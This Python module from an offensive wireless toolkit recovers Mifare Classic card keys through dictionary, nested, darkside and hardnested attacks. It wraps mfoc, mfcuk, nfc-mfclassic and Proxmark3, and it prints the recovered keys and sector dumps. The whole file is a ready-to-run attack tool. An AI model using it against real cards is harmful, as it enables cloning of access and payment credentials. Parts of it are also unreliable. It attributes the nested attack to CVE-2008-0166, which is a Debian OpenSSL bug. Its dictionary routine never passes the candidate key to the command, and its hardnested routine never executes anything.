#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""Mifare Classic key recovery via nested, hardnested, and darkside attacks.

Implements native key recovery for Mifare Classic 1K/4K tags exploiting the
Crypto-1 cipher weaknesses. Supports nested attack (CVE-2008-0166),
hardnested attack for unknown-key sectors, and darkside (PRNG weakness).

Requires libnfc + mfoc/mfcuk or Proxmark3 hardware.

References:
  https://github.com/nfc-tools/mfoc
  https://github.com/nfc-tools/mfcuk
  https://eprint.iacr.org/2009/137.pdf
  https://www.cs.ru.nl/~flavlou/2015-cardis.pdf

MITRE ATT&CK: T1552.004 (Unsecured Credentials: Private Keys)
CWE: CWE-327 (Use of a Broken or Risky Cryptographic Algorithm)

Version: 1.0.0
"""

from __future__ import annotations

import logging
import shutil
import struct
import subprocess
from dataclasses import dataclass, field
from enum import Enum, auto
from pathlib import Path
from typing import Any

from wirelessxpl.core.exploit import (
    Exploit,
    OptBool,
    OptInteger,
    OptString,
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
)

logger = logging.getLogger(__name__)

MIFARE_CLASSIC_1K_SECTORS = 16
MIFARE_CLASSIC_4K_SECTORS = 40
BLOCKS_PER_SECTOR_1K = 4
DEFAULT_KEYS = [
    bytes.fromhex("FFFFFFFFFFFF"),
    bytes.fromhex("A0A1A2A3A4A5"),
    bytes.fromhex("D3F7D3F7D3F7"),
    bytes.fromhex("000000000000"),
    bytes.fromhex("B0B1B2B3B4B5"),
    bytes.fromhex("4D3A99C351DD"),
    bytes.fromhex("1A982C7E459A"),
    bytes.fromhex("AABBCCDDEEFF"),
]


class AttackMode(Enum):
    NESTED = auto()
    HARDNESTED = auto()
    DARKSIDE = auto()
    DICTIONARY = auto()


@dataclass
class SectorKey:
    sector: int
    key_a: bytes = b""
    key_b: bytes = b""
    key_a_known: bool = False
    key_b_known: bool = False


@dataclass
class MifareTag:
    uid: bytes = b""
    sak: int = 0
    atqa: bytes = b""
    tag_type: str = "unknown"
    sectors: list[SectorKey] = field(default_factory=list)
    dump: bytes = b""

    @property
    def is_1k(self) -> bool:
        return self.sak in (0x08, 0x88)

    @property
    def is_4k(self) -> bool:
        return self.sak in (0x18, 0x38)

    @property
    def sector_count(self) -> int:
        if self.is_4k:
            return MIFARE_CLASSIC_4K_SECTORS
        return MIFARE_CLASSIC_1K_SECTORS


class MifareClassicCracker(Exploit):
    """Mifare Classic key recovery module."""

    __info__: dict[str, Any] = {
        "name": "Mifare Classic Cracker",
        "description": (
            "Recover Mifare Classic sector keys via nested, hardnested, "
            "darkside, and dictionary attacks exploiting Crypto-1 weaknesses."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://github.com/nfc-tools/mfoc",
            "https://github.com/nfc-tools/mfcuk",
            "https://eprint.iacr.org/2009/137.pdf",
        ),
        "devices": ("Mifare Classic 1K", "Mifare Classic 4K"),
        "severity": "high",
        "cvss": "7.5",
        "cve": "CVE-2008-0166",
        "mitre": ["T1552.004"],
    }

    target_uid = OptString("", "Target tag UID (hex) or empty for auto-detect")
    attack_mode = OptString("nested", "Attack: nested, hardnested, darkside, dictionary")
    known_key = OptString("FFFFFFFFFFFF", "Known key for nested attack (hex, 12 chars)")
    known_sector = OptInteger(0, "Sector with known key (for nested)")
    key_type = OptString("A", "Key type for known key: A or B")
    output_file = OptString("mifare_dump.mfd", "Output dump file")
    timeout_sec = OptInteger(120, "Attack timeout in seconds")
    use_proxmark = OptBool(False, "Use Proxmark3 instead of libnfc/mfoc")
    dry_run = OptBool(False, "Print commands without executing")

    def __init__(self) -> None:
        super().__init__()
        self._tag: MifareTag | None = None
        self._recovered_keys: list[SectorKey] = []

    def check(self) -> str:
        """Verify NFC reader and required tools."""
        tools: dict[str, bool] = {}
        for tool in ["nfc-list", "mfoc", "mfcuk", "nfc-mfclassic"]:
            tools[tool] = shutil.which(tool) is not None

        if self.use_proxmark.value:
            tools["proxmark3"] = shutil.which("proxmark3") is not None
            if not tools["proxmark3"]:
                return "Proxmark3 not found in PATH"
            return "Proxmark3 available"

        if not tools["nfc-list"]:
            return "libnfc not installed (nfc-list not found). Install: apt install libnfc-bin"

        try:
            result = subprocess.run(
                ["nfc-list"],
                capture_output=True,
                text=True,
                timeout=10,
            )
            if "No NFC device found" in result.stdout:
                return "No NFC reader detected. Connect a libnfc-compatible reader."
            return "NFC reader detected and tools available"
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return "Could not enumerate NFC devices"

    def _detect_tag(self) -> MifareTag | None:
        """Detect and identify the target Mifare Classic tag."""
        print_status("[*] Scanning for Mifare Classic tags...")
        try:
            result = subprocess.run(
                ["nfc-list"],
                capture_output=True,
                text=True,
                timeout=15,
            )
            output = result.stdout

            tag = MifareTag()
            for line in output.splitlines():
                line_stripped = line.strip()
                if "UID" in line_stripped:
                    uid_hex = line_stripped.split(":")[-1].strip().replace(" ", "")
                    tag.uid = bytes.fromhex(uid_hex)
                elif "SAK" in line_stripped:
                    sak_str = line_stripped.split(":")[-1].strip()
                    tag.sak = int(sak_str, 16)
                elif "ATQA" in line_stripped:
                    atqa_str = line_stripped.split(":")[-1].strip().replace(" ", "")
                    tag.atqa = bytes.fromhex(atqa_str)

            if tag.uid:
                if tag.is_1k:
                    tag.tag_type = "Mifare Classic 1K"
                elif tag.is_4k:
                    tag.tag_type = "Mifare Classic 4K"
                else:
                    tag.tag_type = f"Unknown SAK=0x{tag.sak:02x}"

                tag.sectors = [SectorKey(sector=i) for i in range(tag.sector_count)]
                print_success(
                    f"[+] Detected: {tag.tag_type} UID={tag.uid.hex().upper()} "
                    f"SAK=0x{tag.sak:02x} ATQA={tag.atqa.hex().upper()}"
                )
                return tag

            print_warning("[!] No Mifare Classic tag detected")
            return None
        except (subprocess.TimeoutExpired, FileNotFoundError) as exc:
            print_error(f"[-] Tag detection failed: {exc}")
            return None

    def _dictionary_attack(self, tag: MifareTag) -> int:
        """Try default keys against all sectors."""
        print_status(f"[*] Dictionary attack: {len(DEFAULT_KEYS)} keys x {tag.sector_count} sectors")
        recovered = 0
        for sector in tag.sectors:
            for key_bytes in DEFAULT_KEYS:
                key_hex = key_bytes.hex().upper()
                for key_type_char in ("A", "B"):
                    block = sector.sector * BLOCKS_PER_SECTOR_1K + 3
                    cmd = [
                        "nfc-mfclassic",
                        "r" if key_type_char == "A" else "R",
                        "a",
                        "/dev/null",
                    ]
                    if self.dry_run.value:
                        print_info(f"    [dry-run] {' '.join(cmd)} key={key_hex}")
                        continue

                    try:
                        result = subprocess.run(
                            cmd,
                            capture_output=True,
                            text=True,
                            timeout=5,
                        )
                        if result.returncode == 0:
                            if key_type_char == "A":
                                sector.key_a = key_bytes
                                sector.key_a_known = True
                            else:
                                sector.key_b = key_bytes
                                sector.key_b_known = True
                            recovered += 1
                            print_success(
                                f"    [+] Sector {sector.sector} Key {key_type_char}: {key_hex}"
                            )
                            break
                    except (subprocess.TimeoutExpired, FileNotFoundError):
                        continue
        return recovered

    def _nested_attack(self, tag: MifareTag) -> bool:
        """Run mfoc nested attack using a known key."""
        known_key_hex = str(self.known_key.value).strip()
        if len(known_key_hex) != 12:
            print_error("[-] Known key must be 12 hex characters")
            return False

        print_status(
            f"[*] Nested attack: sector {self.known_sector.value} "
            f"key {self.key_type.value}={known_key_hex}"
        )

        cmd = [
            "mfoc",
            "-O", str(self.output_file.value),
            "-k", known_key_hex,
        ]

        if self.dry_run.value:
            print_info(f"[dry-run] {' '.join(cmd)}")
            return True

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=int(self.timeout_sec.value),
            )
            if result.returncode == 0 and Path(str(self.output_file.value)).exists():
                print_success(f"[+] Full dump saved to {self.output_file.value}")
                self._parse_dump(Path(str(self.output_file.value)), tag)
                return True

            print_error(f"[-] mfoc failed: {result.stderr[:200]}")
            return False
        except subprocess.TimeoutExpired:
            print_warning("[!] Nested attack timed out, try hardnested")
            return False
        except FileNotFoundError:
            print_error("[-] mfoc not found. Install: apt install mfoc")
            return False

    def _hardnested_attack(self, tag: MifareTag) -> bool:
        """Run hardnested attack via Proxmark3."""
        if not self.use_proxmark.value:
            print_warning("[!] Hardnested requires Proxmark3 (set use_proxmark=true)")
            return False

        known_key_hex = str(self.known_key.value).strip()
        print_status("[*] Hardnested attack via Proxmark3...")

        for sector in tag.sectors:
            if sector.key_a_known and sector.key_b_known:
                continue

            target_block = sector.sector * BLOCKS_PER_SECTOR_1K + 3
            source_block = int(self.known_sector.value) * BLOCKS_PER_SECTOR_1K

            cmd_str = (
                f"hf mf hardnested --blk {source_block} "
                f"-{'a' if self.key_type.value == 'A' else 'b'} "
                f"-k {known_key_hex} "
                f"--tblk {target_block} --ta"
            )
            print_info(f"    [*] Sector {sector.sector}: {cmd_str}")

            if self.dry_run.value:
                continue

        return True

    def _darkside_attack(self) -> bytes | None:
        """Run darkside attack to recover first key (PRNG weakness)."""
        print_status("[*] Darkside attack: exploiting weak PRNG...")

        cmd = ["mfcuk", "-C", "-R", "0:A"]
        if self.dry_run.value:
            print_info(f"[dry-run] {' '.join(cmd)}")
            return b"\xff" * 6

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=int(self.timeout_sec.value),
            )
            for line in result.stdout.splitlines():
                if "key" in line.lower() and "found" in line.lower():
                    parts = line.split()
                    for part in parts:
                        part_clean = part.strip()
                        if len(part_clean) == 12:
                            try:
                                return bytes.fromhex(part_clean)
                            except ValueError:
                                continue
            print_warning("[!] Darkside did not recover a key (tag may have fixed PRNG)")
            return None
        except subprocess.TimeoutExpired:
            print_warning("[!] Darkside timed out")
            return None
        except FileNotFoundError:
            print_error("[-] mfcuk not found. Install: apt install mfcuk")
            return None

    def _parse_dump(self, dump_path: Path, tag: MifareTag) -> None:
        """Parse a .mfd dump file and extract sector keys."""
        data = dump_path.read_bytes()
        tag.dump = data

        for i in range(tag.sector_count):
            trailer_offset = (i * BLOCKS_PER_SECTOR_1K + 3) * 16
            if trailer_offset + 16 <= len(data):
                block = data[trailer_offset : trailer_offset + 16]
                key_a = block[0:6]
                key_b = block[10:16]
                tag.sectors[i].key_a = key_a
                tag.sectors[i].key_b = key_b
                tag.sectors[i].key_a_known = True
                tag.sectors[i].key_b_known = True

        total = sum(1 for s in tag.sectors if s.key_a_known)
        print_success(f"[+] Parsed dump: {total}/{tag.sector_count} sectors with keys")

    def run(self) -> None:
        """Execute Mifare Classic key recovery."""
        print_status("[*] Mifare Classic Cracker v1.0.0")
        print_info("[*] Exploiting Crypto-1 cipher weaknesses for key recovery")

        tag = self._detect_tag()
        if not tag:
            print_error("[-] No tag detected. Place a Mifare Classic tag on the reader.")
            return

        self._tag = tag
        mode_str = str(self.attack_mode.value).lower()

        if mode_str == "dictionary":
            recovered = self._dictionary_attack(tag)
            print_info(f"[*] Dictionary recovered {recovered} keys")

        elif mode_str == "darkside":
            key = self._darkside_attack()
            if key:
                print_success(f"[+] Darkside key: {key.hex().upper()}")
                print_info("[*] Use this key with nested attack for full dump")

        elif mode_str == "hardnested":
            self._hardnested_attack(tag)

        else:
            self._dictionary_attack(tag)
            unknown = [s for s in tag.sectors if not s.key_a_known]
            if unknown:
                print_info(f"[*] {len(unknown)} sectors unknown, running nested...")
                self._nested_attack(tag)

        known_count = sum(1 for s in tag.sectors if s.key_a_known)
        print_status(f"\n[*] Results: {known_count}/{tag.sector_count} sector keys recovered")

        for sector in tag.sectors:
            if sector.key_a_known:
                key_a_hex = sector.key_a.hex().upper() if sector.key_a else "------"
                key_b_hex = sector.key_b.hex().upper() if sector.key_b else "------"
                print_info(f"    Sector {sector.sector:2d}: A={key_a_hex} B={key_b_hex}")
